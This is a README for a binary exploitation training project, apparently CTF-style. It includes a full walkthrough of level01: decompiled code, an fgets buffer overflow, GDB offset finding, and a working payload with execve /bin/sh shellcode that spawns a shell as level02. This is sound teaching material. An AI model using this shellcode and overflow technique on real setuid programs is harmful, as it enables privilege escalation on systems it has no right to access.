
# Override

OverRide is a hands-on binary exploitation project. It focuses on dissecting and exploiting low-level vulnerabilities in compiled C programs on x86 (i386) architecture.

The primary goal is to analyze binary behavior at runtime, identify unsafe coding patterns like buffer overflows, unsafe memory handling, and exploit them to hijack control flow, typically to execute a shell, read restricted files, or bypass system logic.

Each level is a standalone challenge with increasing complexity, designed to deepen your understanding of how code operates once compiled, and how seemingly harmless logic errors can lead to critical security breaches.

## Bypassing Modern Protections

One of the core challenges of OverRide is not just finding the vulnerabilities — but exploiting them despite modern binary protections in place. These include:
- `Stack canaries` (**Canary**) – Prevents classic buffer overflow attacks by checking for stack corruption.
- `Read-Only Relocations` (**RELRO**) – Protects the Global Offset Table (GOT) from being overwritten.
- `Non-Executable Stack` (**NX**) – Makes it impossible to execute code directly on the stack, preventing classic shellcode execution.
- `Position Independent Executable` (**PIE**) – Randomizes the base address of the binary itself, requiring exploits to leak and calculate function or buffer addresses dynamically.

Each exploit must be tailored to the binary's protection flags. For instance:
- When `NX` is enabled, we use `ret2libc` instead of injecting shellcode.
- If `Canary` is present, `we avoid corrupting the stack past the saved canary value`.
- With `RELRO`, we avoid `GOT overwrites` and instead target `return addresses` or `heap structures`.

Understanding and bypassing these layers of defense is a key learning outcome of the project and mirrors real-world exploitation conditions.

## Skills and Techniques

This project leverages a wide set of skills commonly used in binary exploitation and reverse engineering:
- **Binary Analysis and Debugging**
    - Static analysis with `objdump`, `readelf`
    - Dynamic analysis using `gdb`
    - Memory layout inspection (`stack`, `heap`, `BSS`, `data` `segments`)
    - `Register` and `stack manipulation`

- **Vulnerability Identification** - Each binary contains at least one critical flaw:
    - `Stack-based buffer overflows`
    - Unsafe functions (`gets`, `strcpy`, `strncpy`)
    -` Index-based memory corruption` (ex: unsigned integer overflows)
    - Logic flaws allowing out-of-bounds writes

- **Exploitation Techniques** - Classic exploitation strategies:
    - `Return address overwriting` to hijack control flow
    - `ret2libc` to execute functions like system("/bin/sh")
    - Using crafted memory layouts to inject `payloads`
    - Function pointer overwriting and `command injection`
    - `Privilege escalation` through careful analysis of binary logic


## Structure

Each level contains:
- A C binary with one or more intentional vulnerabilities
- No access to source code — only disassembly and runtime behavior
- A corresponding **walkthrough** explaining:
    - `General informations`
    - `Static Analysis` - Disassembled pseudo code
    - `The vulnerability found`
    - `Dynamic Analysis` - GDB snapshots showing `registers`, `memory`, and `return addresses`
    - `Payload construction` (`shellcode`, `ret2libc` ...)
    - `Final result` (`flag` retrieved or `shell spawned`)


## Walkthrough
For each level, a detailed walkthrough is provided, thoroughly explaining the underlying vulnerabilities, the logic behind the exploit, and the techniques used to manipulate the program's behavior.

For example, see the walkthrough for level01 below.

## level01

### General Informations 

**Path** : `/home/users/level01/level01` </br>
**File** : 
```
level01: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x923fd646950abba3d31df70cad30a6a5ab5760e8, not stripped
```
**Permissions**: `-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01`  </br>
**Protections**:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01
```

### Static Analysis

After decompiling the binary in ghidra, we get the pseudo code below: 

```

int verify_user_name(void)
{
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined1 uVar4;
  undefined1 uVar5;
  byte bVar6;
  
  bVar6 = 0;
  uVar4 = &stack0xfffffff4 < (undefined1 *)0x10;
  uVar5 = &stack0x00000000 == (undefined1 *)0x1c;
  puts("verifying username....\n");
  iVar1 = 7;
  pbVar2 = &a_user_name;
  pbVar3 = (byte *)"dat_wil";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    uVar4 = *pbVar2 < *pbVar3;
    uVar5 = *pbVar2 == *pbVar3;
    pbVar2 = pbVar2 + (uint)bVar6 * -2 + 1;
    pbVar3 = pbVar3 + (uint)bVar6 * -2 + 1;
  } while ((bool)uVar5);
  return (int)(char)((!(bool)uVar4 && !(bool)uVar5) - uVar4);
}

int verify_user_pass(byte *param_1)
{
  int iVar1;
  byte *pbVar2;
  undefined1 in_CF;
  undefined1 in_ZF;
  
  iVar1 = 5;
  pbVar2 = (byte *)"admin";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    in_CF = *param_1 < *pbVar2;
    in_ZF = *param_1 == *pbVar2;
    param_1 = param_1 + 1;
    pbVar2 = pbVar2 + 1;
  } while ((bool)in_ZF);
  return (int)(char)((!(bool)in_CF && !(bool)in_ZF) - in_CF);
}

undefined4 main(void)
{
  undefined4 uVar1;
  int iVar2;
  char *pcVar3;
  char local_54 [64];
  int local_14;
  
  pcVar3 = local_54;
  for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {
    pcVar3[0] = '\0';
    pcVar3[1] = '\0';
    pcVar3[2] = '\0';
    pcVar3[3] = '\0';
    pcVar3 = pcVar3 + 4;
  }
  local_14 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(&a_user_name,0x100,stdin);
  local_14 = verify_user_name();
  if (local_14 == 0) {
    puts("Enter Password: ");
    fgets(local_54,100,stdin);
    local_14 = verify_user_pass(local_54);
    if ((local_14 == 0) || (local_14 != 0)) {
      puts("nope, incorrect password...\n");
      uVar1 = 1;
    }
    else {
      uVar1 = 0;
    }
  }
  else {
    puts("nope, incorrect username...\n");
    uVar1 = 1;
  }
  return uVar1;
}
```

`main`
  - Asks for a username and passes it to the `verify_user_name` function.
  - If the username is equal to `dat_wil`, it then asks for a password and passes it to the `verify_user_pass` function.
  - Regardless of whether the password is valid or not, an error message is printed.
  - The remaining instructions either set a return value or display another error message.

There are no hidden functions or obvious ways to spawn a shell from the code itself, which means we’ll need to inject our own `shellcode` and find a way to execute it. </br>

One interesting thing is that the password is stored in a 64-byte buffer (`local_54[64]`), but `fgets` reads up to `0x100 (256)` bytes into it — this results in a buffer overflow.


### Vulnerability found 

The vulnerability lies in the size passed to `fgets`, which exceeds the size of the buffer, resulting in a buffer overflow.

### Dynamic Analysis

We start by unsetting the environment variable in GDB and placing breakpoints after the first and second calls to `fgets`.
```
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b *0x08048579
``` 

We'll fill the second buffer to observe how the program behaves:
```
(gdb) r < <(python -c 'print "dat_wil\n" + "A"*256')
...
Breakpoint 2, 0x08048579 in main ()
(gdb) c
...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
We observed that the expected username is `dat_wil`, as the program break before the password comparison. </br> 
More importantly, filling the second buffer completely leads to a segmentation fault and overwrites the return address of main with `0x41414141`.

Next, we set a breakpoint before the second `scanf` to inspect the stack and determine the correct offset to overwrite the return address.
```
(gdb) b *0x08048574
(gdb) r < <(python -c 'print "dat_wil\n" + "A"*256')
(gdb) x $ebp + 4
0xffffd62c:	0xf7e45513
(gdb) x/50x $esp 
0xffffd5c0:	0xffffd5dc	0x00000064	0xf7fcfac0	0xf7ec34fb
0xffffd5d0:	0xffffd808	0x0000002f	0xffffd62c	0x41414141
0xffffd5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd600:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd610:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd620:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd630:	0x41414141	0x41414141	0x41414141	0x00414141
0xffffd640:	0x00000000	0xffffd61c	0xffffd6cc	0x00000000
```

The password buffer starts at `0xffffd5dc` and the return address of main is located at `0xffffd62c`, giving us a padding of `80 bytes (0xffffd62c - 0xffffd5dc)`. [hex calculator](https://www.calculator.net/hex-calculator.html?number1=ffffd62c&c2op=-&number2=ffffd5dc&calctype=op&x=Calculate)

Let's try it:
```
(gdb) r < <(python -c 'print "dat_wil\n" + "A"*80 + "B"*4')
...
0x42424242 in ?? ()
```

With that's confirmed, we inject a shellcode in the first 21 bytes of the buffer and replace the overwritten return address `BBBB` with the shellcode’s start address: `0xffffd5dc`. </br>
shellcode: `\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

```
(gdb) r < <(python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*(80-21) + "\xdc\xd5\xff\xff"')
...
process 2216 is executing new program: /bin/dash
```

The shellcode is executed in GDB. 

### Payload construction 

First we write the shellcode at the beginning of the buffer 
```
python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'
```

Then we add the padding correctly up to the return address
```
python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*(80-21) + "ret_address_main"
```

Finally after fuzzed nearby addresses, we found `0xffffd5ec`:
```
python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*(80-21) + "\xec\xd5\xff\xff"'
```

### Demonstration 

```
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*(80-21) + "\xec\xd5\xff\xff"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
```
